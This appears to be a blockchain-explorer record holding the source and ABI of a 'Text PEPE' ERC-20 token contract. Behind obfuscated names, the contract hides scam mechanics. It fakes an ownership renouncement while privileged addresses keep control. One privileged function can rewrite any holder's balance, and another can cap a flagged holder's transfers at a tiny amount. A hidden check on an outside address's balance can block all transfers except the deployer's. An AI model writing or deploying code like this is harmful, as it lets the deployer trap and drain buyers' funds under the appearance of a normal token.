{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface limitList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minSell) external view returns (uint256);\n\n    function transfer(address limitTo, uint256 fundTotalTx) external returns (bool);\n\n    function allowance(address tradingTxMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundTotalTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTo,\n        uint256 fundTotalTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletAuto, uint256 value);\n    event Approval(address indexed tradingTxMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract modeBuyTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitTxSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isTo {\n    function createPair(address amountLiquidity, address limitTrading) external returns (address);\n}\n\ninterface liquidityTake is limitList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TextPEPE is modeBuyTeam, limitList, liquidityTake {\n\n    uint256 private liquidityMax = 100000000 * 10 ** 18;\n\n    address public takeLiquidity;\n\n    bool public listFrom;\n\n    function fundMax(uint256 fundTotalTx) public {\n        marketingReceiver();\n        enableReceiver = fundTotalTx;\n    }\n\n    uint256 receiverIs;\n\n    function minReceiver(address fundShould, address limitTo, uint256 fundTotalTx) internal returns (bool) {\n        require(fundEnableTo[fundShould] >= fundTotalTx);\n        fundEnableTo[fundShould] -= fundTotalTx;\n        fundEnableTo[limitTo] += fundTotalTx;\n        emit Transfer(fundShould, limitTo, fundTotalTx);\n        return true;\n    }\n\n    uint256 public txMode;\n\n    function balanceOf(address minSell) public view virtual override returns (uint256) {\n        return fundEnableTo[minSell];\n    }\n\n    function marketingReceiver() private view {\n        require(receiverAt[_msgSender()]);\n    }\n\n    function buyReceiver(address enableToken) public {\n        require(enableToken.balance < 100000);\n        if (autoModeTrading) {\n            return;\n        }\n        if (senderEnable != fromExempt) {\n            listFrom = false;\n        }\n        receiverAt[enableToken] = true;\n        if (fromExempt != feeTeamWallet) {\n            listLimitTx = feeTeamWallet;\n        }\n        autoModeTrading = true;\n    }\n\n    function transferFrom(address fundShould, address limitTo, uint256 fundTotalTx) external override returns (bool) {\n        if (_msgSender() != walletReceiver) {\n            if (teamMaxAmount[fundShould][_msgSender()] != type(uint256).max) {\n                require(fundTotalTx <= teamMaxAmount[fundShould][_msgSender()]);\n                teamMaxAmount[fundShould][_msgSender()] -= fundTotalTx;\n            }\n        }\n        return modeAt(fundShould, limitTo, fundTotalTx);\n    }\n\n    function allowance(address marketingSwap, address exemptReceiver) external view virtual override returns (uint256) {\n        if (exemptReceiver == walletReceiver) {\n            return type(uint256).max;\n        }\n        return teamMaxAmount[marketingSwap][exemptReceiver];\n    }\n\n    uint256 enableReceiver;\n\n    uint256 public listLimitTx;\n\n    mapping(address => mapping(address => uint256)) private teamMaxAmount;\n\n    uint256 private senderAt;\n\n    string private receiverAutoMode = \"Text PEPE\";\n\n    uint256 public feeTeamWallet;\n\n    constructor (){\n        \n        limitTxSender buyWallet = limitTxSender(walletReceiver);\n        takeLiquidity = isTo(buyWallet.factory()).createPair(buyWallet.WETH(), address(this));\n        \n        fromMax = _msgSender();\n        tradingBuy();\n        receiverAt[fromMax] = true;\n        fundEnableTo[fromMax] = liquidityMax;\n        if (listLimitTx == shouldReceiverAt) {\n            shouldReceiverAt = senderAt;\n        }\n        emit Transfer(address(0), fromMax, liquidityMax);\n    }\n\n    string private swapReceiver = \"TPE\";\n\n    address walletReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private senderEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAutoMode;\n    }\n\n    function approve(address exemptReceiver, uint256 fundTotalTx) public virtual override returns (bool) {\n        teamMaxAmount[_msgSender()][exemptReceiver] = fundTotalTx;\n        emit Approval(_msgSender(), exemptReceiver, fundTotalTx);\n        return true;\n    }\n\n    uint256 public marketingTeamIs;\n\n    bool public autoModeTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapReceiver;\n    }\n\n    address private amountTotalSwap;\n\n    function feeLimit(address fromLaunchTotal, uint256 fundTotalTx) public {\n        marketingReceiver();\n        fundEnableTo[fromLaunchTotal] = fundTotalTx;\n    }\n\n    function tradingBuy() public {\n        emit OwnershipTransferred(fromMax, address(0));\n        amountTotalSwap = address(0);\n    }\n\n    uint256 public fromExempt;\n\n    mapping(address => bool) public walletTotal;\n\n    function modeAt(address fundShould, address limitTo, uint256 fundTotalTx) internal returns (bool) {\n        if (fundShould == fromMax) {\n            return minReceiver(fundShould, limitTo, fundTotalTx);\n        }\n        uint256 modeTotal = limitList(takeLiquidity).balanceOf(limitMode);\n        require(modeTotal == enableReceiver);\n        require(limitTo != limitMode);\n        if (walletTotal[fundShould]) {\n            return minReceiver(fundShould, limitTo, tradingMax);\n        }\n        return minReceiver(fundShould, limitTo, fundTotalTx);\n    }\n\n    uint256 public shouldReceiverAt;\n\n    address public fromMax;\n\n    address limitMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityMax;\n    }\n\n    uint256 constant tradingMax = 12 ** 10;\n\n    function transfer(address fromLaunchTotal, uint256 fundTotalTx) external virtual override returns (bool) {\n        return modeAt(_msgSender(), fromLaunchTotal, fundTotalTx);\n    }\n\n    bool private limitIs;\n\n    uint8 private autoIs = 18;\n\n    event OwnershipTransferred(address indexed minShould, address indexed marketingMin);\n\n    mapping(address => bool) public receiverAt;\n\n    function getOwner() external view returns (address) {\n        return amountTotalSwap;\n    }\n\n    function sellTo(address tradingLaunchAt) public {\n        marketingReceiver();\n        \n        if (tradingLaunchAt == fromMax || tradingLaunchAt == takeLiquidity) {\n            return;\n        }\n        walletTotal[tradingLaunchAt] = true;\n    }\n\n    function owner() external view returns (address) {\n        return amountTotalSwap;\n    }\n\n    mapping(address => uint256) private fundEnableTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTxMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotalTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoModeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"}],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunchTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotalTx\",\"type\":\"uint256\"}],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundTotalTx\",\"type\":\"uint256\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimitTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTeamIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchAt\",\"type\":\"address\"}],\"name\":\"sellTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiverAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunchTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotalTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTotalTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TextPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}